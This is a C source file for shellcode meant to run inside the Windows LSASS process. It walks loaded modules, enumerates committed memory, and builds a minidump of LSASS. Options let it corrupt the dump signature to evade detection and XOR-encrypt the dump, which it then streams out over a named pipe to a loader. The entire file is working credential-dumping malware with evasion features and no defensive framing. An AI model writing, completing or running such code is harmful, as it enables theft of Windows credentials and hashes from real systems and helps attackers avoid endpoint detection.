/*
 * PIC Shellcode — runs inside LSASS via section mapping.
 * Reads LSASS memory, streams minidump over named pipe.
 * NO CRT, NO string literals, NO globals. Pure .text output.
 *
 * Compile: x86_64-w64-mingw32-gcc -c -Os -nostdlib -fno-stack-protector
 *          -fno-jump-tables -fno-exceptions -fno-asynchronous-unwind-tables
 */

/* === MINIMAL TYPE DEFINITIONS === */
typedef unsigned char      BYTE;
typedef unsigned short     USHORT;
typedef unsigned short     WCHAR;
typedef unsigned int       DWORD;
typedef unsigned long long QWORD;
typedef long               LONG;
typedef long               NTSTATUS;
typedef void*              PVOID;
typedef void*              HANDLE;
typedef QWORD              SIZE_T;
typedef QWORD              ULONG_PTR;
typedef QWORD              ACCESS_MASK;

#define NULL               ((void*)0)
#define TRUE               1
#define FALSE              0
#define NT_SUCCESS(s)      ((s) >= 0)

/* Minidump constants */
#define MINIDUMP_SIGNATURE    0x504d444d
#define MINIDUMP_VERSION      42899
#define MINIDUMP_IMPL_VERSION 0
#define SystemInfoStream      7
#define ModuleListStream      4
#define Memory64ListStream    9
#define MiniDumpNormal        0
#define PROCESSOR_AMD64       9
#define VER_NT_WORKSTATION    1

#define MEM_COMMIT         0x1000
#define MEM_MAPPED         0x40000
#define MEM_IMAGE          0x1000000
#define PAGE_NOACCESS      0x01
#define PAGE_GUARD         0x100
#define PAGE_EXECUTE       0x10
#define MEM_RESERVE        0x2000
#define PAGE_READWRITE     0x04

#define DUMP_MAX_SIZE      0x0c800000

typedef struct { USHORT Length; USHORT MaximumLength; WCHAR *Buffer; } USTR;
typedef struct {
    DWORD Length; HANDLE RootDirectory; USTR *ObjectName;
    DWORD Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;
} OA;
typedef struct { NTSTATUS Status; QWORD Information; } IOSB;
typedef struct { QWORD QuadPart; } LI;
typedef struct {
    PVOID BaseAddress; QWORD AllocationBase; DWORD AllocationProtect; DWORD pad1;
    QWORD RegionSize; DWORD State; DWORD Protect; DWORD Type; DWORD pad2;
} MBI;

/* === PARAMS STRUCT (shared with loader) === */
typedef struct {
    volatile DWORD status;
    DWORD error_code;
    DWORD dump_size_lo;
    DWORD dump_size_hi;
    WCHAR pipe_name[128];
    BYTE  xor_key[4];
    DWORD use_valid_sig;
    PVOID fn_NtQueryVirtualMemory;
    PVOID fn_NtCreateFile;
    PVOID fn_NtWriteFile;
    PVOID fn_NtClose;
    PVOID fn_NtAllocateVirtualMemory;
    PVOID fn_NtFreeVirtualMemory;
} SC_PARAMS;

/* === FUNCTION POINTER TYPES === */
typedef NTSTATUS (*fn_NtQVM)(HANDLE, PVOID, int, PVOID, SIZE_T, SIZE_T*);
typedef NTSTATUS (*fn_NtCF)(HANDLE*, ACCESS_MASK, OA*, IOSB*, LI*, DWORD, DWORD, DWORD, DWORD, PVOID, DWORD);
typedef NTSTATUS (*fn_NtWF)(HANDLE, HANDLE, PVOID, PVOID, IOSB*, PVOID, DWORD, LI*, DWORD*);
typedef NTSTATUS (*fn_NtCl)(HANDLE);
typedef NTSTATUS (*fn_NtAVM)(HANDLE, PVOID*, QWORD, SIZE_T*, DWORD, DWORD);
typedef NTSTATUS (*fn_NtFVM)(HANDLE, PVOID*, SIZE_T*, DWORD);

/* === INLINE HELPERS === */

static void sc_memcpy(void *d, const void *s, QWORD n) {
    BYTE *dd = (BYTE*)d; const BYTE *ss = (const BYTE*)s;
    while (n--) *dd++ = *ss++;
}

static void sc_memset(void *d, BYTE v, QWORD n) {
    BYTE *dd = (BYTE*)d;
    while (n--) *dd++ = v;
}

static USHORT sc_wcslen(const WCHAR *s) {
    USHORT n = 0;
    while (s[n]) n++;
    return n;
}

/* DJB2 hash of lowercase wide string */
static DWORD sc_hash_name(const WCHAR *name, USHORT len_chars) {
    DWORD h = 5381;
    USHORT i;
    for (i = 0; i < len_chars && name[i]; i++) {
        WCHAR c = name[i];
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
    }
    return h;
}

static int sc_is_important(DWORD hash) {
    switch (hash) {
    case 0x69c324ea: return 1;
    case 0xc56bcb85: return 1;
    case 0x8a87bcf8: return 1;
    case 0xc672fe06: return 1;
    case 0x58d6cd6c: return 1;
    case 0x66e10db5: return 1;
    case 0xdc7ce818: return 1;
    case 0x72ee6f6d: return 1;
    case 0xacb73ddd: return 1;
    case 0x534c0eb5: return 1;
    case 0x6863254b: return 1;
    case 0x42013f90: return 1;
    case 0xa37f444f: return 1;
    case 0x458e6876: return 1;
    case 0x58bb7a73: return 1;
    case 0xefa24781: return 1;
    case 0x0fd0c0a2: return 1;
    case 0xaace2e37: return 1;
    default:         return 0;
    }
}

/* === PIPE HELPERS === */

static HANDLE sc_open_pipe(SC_PARAMS *p) {
    fn_NtCF ntcf = (fn_NtCF)p->fn_NtCreateFile;
    HANDLE hPipe = NULL;
    IOSB iosb;
    OA oa;
    USTR ustr;

    USHORT name_len = sc_wcslen(p->pipe_name);
    ustr.Buffer = p->pipe_name;
    ustr.Length = name_len * 2;
    ustr.MaximumLength = (name_len + 1) * 2;

    sc_memset(&oa, 0, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &ustr;

    sc_memset(&iosb, 0, sizeof(iosb));

    ntcf(&hPipe, 0x40100080 /* FILE_WRITE_DATA|SYNCHRONIZE|FILE_WRITE_ATTRIBUTES */,
         &oa, &iosb, NULL,
         0x80 /* FILE_ATTRIBUTE_NORMAL */,
         0    /* no sharing */,
         1    /* FILE_OPEN */,
         0x20 /* FILE_SYNCHRONOUS_IO_NONALERT */,
         NULL, 0);

    return hPipe;
}

static int sc_write_pipe(SC_PARAMS *p, HANDLE hPipe, PVOID buf, DWORD size) {
    fn_NtWF ntwf = (fn_NtWF)p->fn_NtWriteFile;
    DWORD offset = 0;
    while (offset < size) {
        IOSB iosb;
        DWORD chunk = size - offset;
        if (chunk > 0x10000) chunk = 0x10000;
        sc_memset(&iosb, 0, sizeof(iosb));
        NTSTATUS st = ntwf(hPipe, NULL, NULL, NULL, &iosb,
                           (PVOID)((ULONG_PTR)buf + offset), chunk, NULL, NULL);
        if (!NT_SUCCESS(st)) return 0;
        offset += chunk;
    }
    return 1;
}

/* === MODULE INFO === */

typedef struct _mod_info {
    QWORD dll_base;
    DWORD size_of_image;
    DWORD checksum;
    DWORD timedatestamp;
    USHORT name_len;
    WCHAR dll_name[260];
    int   important;
    int   used;
} mod_info;

/* Read PE header fields from a module's base address */
static void sc_read_pe_info(QWORD base, DWORD *checksum, DWORD *timedatestamp) {
    BYTE *b = (BYTE*)base;
    DWORD e_lfanew;
    *checksum = 0;
    *timedatestamp = 0;
    if (b[0] != 'M' || b[1] != 'Z') return;
    sc_memcpy(&e_lfanew, b + 0x3C, 4);
    if (e_lfanew > 0x1000) return;
    sc_memcpy(timedatestamp, b + e_lfanew + 8, 4);
    sc_memcpy(checksum, b + e_lfanew + 0x58, 4);
}

/* Walk PEB->Ldr and collect modules */
static int sc_collect_modules(mod_info *mods, int max_mods, int *out_count) {
    BYTE *peb;
    BYTE *ldr;
    BYTE *list_head;
    BYTE *entry;
    int count = 0;

    /* Read PEB from GS */
    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
    if (!peb) return 0;

    /* PEB->Ldr at offset 0x18 */
    sc_memcpy(&ldr, peb + 0x18, 8);
    if (!ldr) return 0;

    /* InLoadOrderModuleList at Ldr+0x10 */
    list_head = ldr + 0x10;
    sc_memcpy(&entry, list_head, 8); /* Flink */

    while (entry != list_head && count < max_mods) {
        QWORD dll_base;
        DWORD size_of_image;
        USHORT name_len;
        WCHAR *name_buf;
        DWORD hash;

        /* LDR_DATA_TABLE_ENTRY offsets (x64):
         *   +0x00 InLoadOrderLinks
         *   +0x30 DllBase
         *   +0x40 SizeOfImage
         *   +0x48 FullDllName (UNICODE_STRING)
         *   +0x58 BaseDllName (UNICODE_STRING)
         *   +0x58: Length, +0x5A: MaxLength, +0x60: Buffer
         */
        sc_memcpy(&dll_base, entry + 0x30, 8);
        sc_memcpy(&size_of_image, entry + 0x40, 4);
        sc_memcpy(&name_len, entry + 0x58, 2); /* BaseDllName.Length (bytes) */
        sc_memcpy(&name_buf, entry + 0x60, 8); /* BaseDllName.Buffer */

        if (dll_base && name_buf && name_len > 0) {
            USHORT name_chars = name_len / 2;
            mod_info *m = &mods[count];
            m->dll_base = dll_base;
            m->size_of_image = size_of_image;
            m->used = 1;

            /* Copy base name for hash */
            USHORT copy_chars = name_chars;
            if (copy_chars > 259) copy_chars = 259;
            sc_memcpy(m->dll_name, name_buf, copy_chars * 2);
            m->dll_name[copy_chars] = 0;

            /* Now get full path from FullDllName */
            USHORT full_len;
            WCHAR *full_buf;
            sc_memcpy(&full_len, entry + 0x48, 2);
            sc_memcpy(&full_buf, entry + 0x50, 8);
            if (full_buf && full_len > 0) {
                USHORT fc = full_len / 2;
                if (fc > 259) fc = 259;
                sc_memcpy(m->dll_name, full_buf, fc * 2);
                m->dll_name[fc] = 0;
                m->name_len = fc;
            } else {
                m->name_len = copy_chars;
            }

            hash = sc_hash_name(name_buf, name_chars);
            m->important = sc_is_important(hash);

            sc_read_pe_info(dll_base, &m->checksum, &m->timedatestamp);
            count++;
        }

        /* Follow Flink */
        sc_memcpy(&entry, entry, 8);
    }

    *out_count = count;
    return 1;
}

/* Check if address falls in an important module */
static int sc_in_important_module(QWORD addr, mod_info *mods, int count) {
    int i;
    for (i = 0; i < count; i++) {
        if (!mods[i].important) continue;
        if (addr >= mods[i].dll_base &&
            addr < mods[i].dll_base + mods[i].size_of_image)
            return 1;
    }
    return 0;
}

/* === MINIDUMP FORMAT WRITER === */

typedef struct {
    BYTE *base;
    DWORD rva;
    DWORD max_size;
} dctx;

static int dc_append(dctx *dc, const void *data, DWORD size) {
    if (dc->rva + size > dc->max_size) return 0;
    sc_memcpy(dc->base + dc->rva, data, size);
    dc->rva += size;
    return 1;
}

static void dc_write_at(dctx *dc, DWORD rva, const void *data, DWORD size) {
    sc_memcpy(dc->base + rva, data, size);
}

static int sc_write_header(dctx *dc, int valid_sig) {
    BYTE hdr[32];
    DWORD sig, nstreams, sdir_rva, zero = 0, flags = MiniDumpNormal;
    USHORT ver, impl;
    sc_memset(hdr, 0, 32);
    sig = valid_sig ? MINIDUMP_SIGNATURE : (MINIDUMP_SIGNATURE ^ 0xDEADBEEF);
    ver = valid_sig ? MINIDUMP_VERSION : (USHORT)(MINIDUMP_VERSION ^ 0x4141);
    impl = valid_sig ? MINIDUMP_IMPL_VERSION : (USHORT)0x4242;
    nstreams = 3;
    sdir_rva = 32;
    sc_memcpy(hdr + 0, &sig, 4);
    sc_memcpy(hdr + 4, &ver, 2);
    sc_memcpy(hdr + 6, &impl, 2);
    sc_memcpy(hdr + 8, &nstreams, 4);
    sc_memcpy(hdr + 12, &sdir_rva, 4);
    sc_memcpy(hdr + 16, &zero, 4);
    sc_memcpy(hdr + 20, &zero, 4);
    sc_memcpy(hdr + 24, &zero, 4);
    sc_memcpy(hdr + 28, &flags, 4);
    return dc_append(dc, hdr, 32);
}

static int sc_write_directories(dctx *dc) {
    BYTE dir[12];
    DWORD type, zero = 0;
    /* SystemInfoStream */
    sc_memset(dir, 0, 12); type = SystemInfoStream;
    sc_memcpy(dir, &type, 4);
    if (!dc_append(dc, dir, 12)) return 0;
    /* ModuleListStream */
    sc_memset(dir, 0, 12); type = ModuleListStream;
    sc_memcpy(dir, &type, 4);
    if (!dc_append(dc, dir, 12)) return 0;
    /* Memory64ListStream */
    sc_memset(dir, 0, 12); type = Memory64ListStream;
    sc_memcpy(dir, &type, 4);
    if (!dc_append(dc, dir, 12)) return 0;
    return 1;
}

static int sc_write_sysinfo(dctx *dc) {
    BYTE *peb;
    DWORD major, minor, platid;
    USHORT build, suite = 0, reserved2 = 0;
    BYTE nproc = 0, prodtype = VER_NT_WORKSTATION;
    QWORD feat1 = 0, feat2 = 0;
    USHORT arch = PROCESSOR_AMD64, plevel = 0, prev = 0;
    DWORD stream_rva, stream_size, sp_rva;
    BYTE sysinfo[48];
    USTR *csd;

    __asm__ volatile("mov %%gs:0x60, %0" : "=r"(peb));
    sc_memcpy(&major, peb + 0x118, 4);
    sc_memcpy(&minor, peb + 0x11c, 4);
    sc_memcpy(&build, peb + 0x120, 2);
    sc_memcpy(&platid, peb + 0x124, 4);
    csd = (USTR*)(peb + 0x2E8);

    sc_memset(sysinfo, 0, 48);
    sc_memcpy(sysinfo + 0, &arch, 2);
    sc_memcpy(sysinfo + 2, &plevel, 2);
    sc_memcpy(sysinfo + 4, &prev, 2);
    sc_memcpy(sysinfo + 6, &nproc, 1);
    sc_memcpy(sysinfo + 7, &prodtype, 1);
    sc_memcpy(sysinfo + 8, &major, 4);
    sc_memcpy(sysinfo + 12, &minor, 4);
    sc_memcpy(sysinfo + 16, &build, 4);
    sc_memcpy(sysinfo + 20, &platid, 4);
    /* CSDVersionRva at offset 24 — filled below */
    sc_memcpy(sysinfo + 28, &suite, 2);
    sc_memcpy(sysinfo + 30, &reserved2, 2);
    sc_memcpy(sysinfo + 32, &feat1, 8);
    sc_memcpy(sysinfo + 40, &feat2, 8);

    stream_rva = dc->rva;
    stream_size = 48;
    if (!dc_append(dc, sysinfo, 48)) return 0;

    /* Write CSD version string */
    sp_rva = dc->rva;
    dc_write_at(dc, stream_rva + 24, &sp_rva, 4);
    {
        DWORD sp_len = csd->Length;
        if (!dc_append(dc, &sp_len, 4)) return 0;
        if (sp_len > 0 && csd->Buffer)
            if (!dc_append(dc, csd->Buffer, sp_len)) return 0;
    }

    /* Patch directory 0 */
    dc_write_at(dc, 32 + 4, &stream_size, 4);
    dc_write_at(dc, 32 + 8, &stream_rva, 4);

    return 1;
}

static int sc_write_module_list(dctx *dc, mod_info *mods, int mod_count) {
    DWORD stream_rva, stream_size;
    DWORD name_rvas[64];
    int i;
    DWORD num = 0;

    /* First pass: write module names, record RVAs */
    for (i = 0; i < mod_count && i < 64; i++) {
        if (!mods[i].used) continue;
        name_rvas[i] = dc->rva;
        DWORD name_byte_len = (mods[i].name_len + 1) * 2;
        if (!dc_append(dc, &name_byte_len, 4)) return 0;
        if (!dc_append(dc, mods[i].dll_name, name_byte_len)) return 0;
        num++;
    }

    stream_rva = dc->rva;
    if (!dc_append(dc, &num, 4)) return 0;

    /* Second pass: write module entries (108 bytes each) */
    for (i = 0; i < mod_count && i < 64; i++) {
        BYTE entry[108];
        if (!mods[i].used) continue;
        sc_memset(entry, 0, 108);
        sc_memcpy(entry + 0, &mods[i].dll_base, 8);
        sc_memcpy(entry + 8, &mods[i].size_of_image, 4);
        sc_memcpy(entry + 12, &mods[i].checksum, 4);
        sc_memcpy(entry + 16, &mods[i].timedatestamp, 4);
        sc_memcpy(entry + 20, &name_rvas[i], 4);
        if (!dc_append(dc, entry, 108)) return 0;
    }

    stream_size = 4 + num * 108;
    /* Patch directory 1 */
    dc_write_at(dc, 32 + 12 + 4, &stream_size, 4);
    dc_write_at(dc, 32 + 12 + 8, &stream_rva, 4);

    return 1;
}

/* Memory range entry for linked list on stack */
typedef struct _mrange {
    QWORD start;
    QWORD size;
} mrange;

static int sc_write_memory(dctx *dc, SC_PARAMS *p, mod_info *mods, int mod_count, PVOID dump_buf_addr, SIZE_T dump_buf_size) {
    fn_NtQVM ntqvm = (fn_NtQVM)p->fn_NtQueryVirtualMemory;
    QWORD cur_addr = 0;
    MBI mbi;
    DWORD stream_rva;
    QWORD num_ranges = 0;
    QWORD base_rva;
    DWORD max_ranges = 4096;
    /* Use space after current RVA temporarily for range list */
    mrange *ranges;
    DWORD range_list_offset;
    DWORD i;

    /* Save stream start */
    stream_rva = dc->rva;

    /* First pass: enumerate ranges */
    /* We'll store ranges temporarily, then write headers + content */
    ranges = (mrange*)(dc->base + dc->max_size - max_ranges * sizeof(mrange));

    while (num_ranges < max_ranges) {
        NTSTATUS st = ntqvm((HANDLE)(QWORD)-1, (PVOID)cur_addr, 0 /*MemoryBasicInformation*/,
                            &mbi, sizeof(mbi), NULL);
        if (!NT_SUCCESS(st)) break;

        QWORD region_end = (QWORD)mbi.BaseAddress + mbi.RegionSize;
        if (region_end <= (QWORD)mbi.BaseAddress) break;
        cur_addr = region_end;

        if (mbi.State != MEM_COMMIT) continue;
        if (mbi.Type == MEM_MAPPED) continue;
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS) continue;
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD) continue;
        if (mbi.Protect == PAGE_EXECUTE) continue;
        if (mbi.Type == MEM_IMAGE &&
            !sc_in_important_module((QWORD)mbi.BaseAddress, mods, mod_count))
            continue;
        /* Don't dump our own allocations */
        {
            QWORD rg_start = (QWORD)mbi.BaseAddress;
            QWORD rg_end   = rg_start + mbi.RegionSize;
            QWORD sec_start = (QWORD)p & ~(QWORD)0xFFF;
            QWORD sec_end   = sec_start + 0x4000;
            QWORD db_start  = (QWORD)dump_buf_addr;
            QWORD db_end    = db_start + dump_buf_size;
            /* Skip section mapping */
            if (rg_start < sec_end && rg_end > sec_start) continue;
            /* Skip dump buffer */
            if (rg_start < db_end && rg_end > db_start) continue;
        }

        ranges[num_ranges].start = (QWORD)mbi.BaseAddress;
        ranges[num_ranges].size = mbi.RegionSize;
        num_ranges++;
    }

    /* Write Memory64ListStream header */
    if (!dc_append(dc, &num_ranges, 8)) return 0;

    /* Placeholder for BaseRva (offset to actual content) */
    DWORD base_rva_offset = dc->rva;
    base_rva = 0;
    if (!dc_append(dc, &base_rva, 8)) return 0;

    /* Write range descriptors */
    for (i = 0; i < (DWORD)num_ranges; i++) {
        if (!dc_append(dc, &ranges[i].start, 8)) return 0;
        if (!dc_append(dc, &ranges[i].size, 8)) return 0;
    }

    /* Now BaseRva = current position */
    base_rva = dc->rva;
    dc_write_at(dc, base_rva_offset, &base_rva, 8);

    /* Patch directory 2 */
    {
        DWORD ssize = (DWORD)(16 + 16 * num_ranges);
        dc_write_at(dc, 32 + 24 + 4, &ssize, 4);
        dc_write_at(dc, 32 + 24 + 8, &stream_rva, 4);
    }

    /* Write memory content */
    for (i = 0; i < (DWORD)num_ranges; i++) {
        QWORD sz = ranges[i].size;
        if (dc->rva + sz > dc->max_size - max_ranges * sizeof(mrange))
            sz = dc->max_size - max_ranges * sizeof(mrange) - dc->rva;
        if (sz > 0) {
            sc_memcpy(dc->base + dc->rva, (void*)ranges[i].start, sz);
            dc->rva += (DWORD)sz;
        }
    }

    return 1;
}

static void sc_xor_encrypt(BYTE *data, DWORD size, BYTE *key) {
    DWORD i;
    for (i = 0; i < size; i++)
        data[i] ^= key[i % 4];
}

/* === ENTRY POINT === */

DWORD sc_entry(SC_PARAMS *p) {
    fn_NtAVM ntavm = (fn_NtAVM)p->fn_NtAllocateVirtualMemory;
    fn_NtFVM ntfvm = (fn_NtFVM)p->fn_NtFreeVirtualMemory;
    fn_NtCl  ntcl  = (fn_NtCl)p->fn_NtClose;
    HANDLE hPipe = NULL;
    PVOID dump_buf = NULL;
    SIZE_T dump_alloc = DUMP_MAX_SIZE;
    dctx dc;
    mod_info modules[64];
    int mod_count = 0;
    NTSTATUS st;
    int i;

    p->status = 1; /* working */

    /* Allocate dump buffer in LSASS heap */
    st = ntavm((HANDLE)(QWORD)-1, &dump_buf, 0, &dump_alloc,
               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        p->error_code = (DWORD)st;
        p->status = 0xDEAD;
        return 1;
    }

    sc_memset(dump_buf, 0, 0x1000); /* clear first page */

    dc.base = (BYTE*)dump_buf;
    dc.rva = 0;
    dc.max_size = (DWORD)dump_alloc;

    /* Collect modules */
    sc_memset(modules, 0, sizeof(modules));
    if (!sc_collect_modules(modules, 64, &mod_count)) {
        p->error_code = 0xE0000001;
        p->status = 0xDEAD;
        goto cleanup;
    }

    /* Build minidump */
    if (!sc_write_header(&dc, p->use_valid_sig)) goto fail;
    if (!sc_write_directories(&dc)) goto fail;
    if (!sc_write_sysinfo(&dc)) goto fail;
    if (!sc_write_module_list(&dc, modules, mod_count)) goto fail;
    if (!sc_write_memory(&dc, p, modules, mod_count, dump_buf, dump_alloc)) goto fail;

    /* XOR encrypt */
    if (p->xor_key[0] || p->xor_key[1] || p->xor_key[2] || p->xor_key[3])
        sc_xor_encrypt(dc.base, dc.rva, p->xor_key);

    /* Open pipe and send dump */
    hPipe = sc_open_pipe(p);
    if (!hPipe) {
        p->error_code = 0xE0000002;
        p->status = 0xDEAD;
        goto cleanup;
    }

    if (!sc_write_pipe(p, hPipe, dc.base, dc.rva)) {
        p->error_code = 0xE0000003;
        p->status = 0xDEAD;
        goto cleanup;
    }

    /* Success */
    p->dump_size_lo = dc.rva;
    p->dump_size_hi = 0;
    p->status = 0x444F4E45; /* "DONE" */
    goto cleanup;

fail:
    p->error_code = 0xE0000004;
    p->status = 0xDEAD;

cleanup:
    if (hPipe) ntcl(hPipe);
    if (dump_buf) {
        SIZE_T free_size = 0;
        ntfvm((HANDLE)(QWORD)-1, &dump_buf, &free_size, 0x8000 /* MEM_RELEASE */);
    }
    return 0;
}
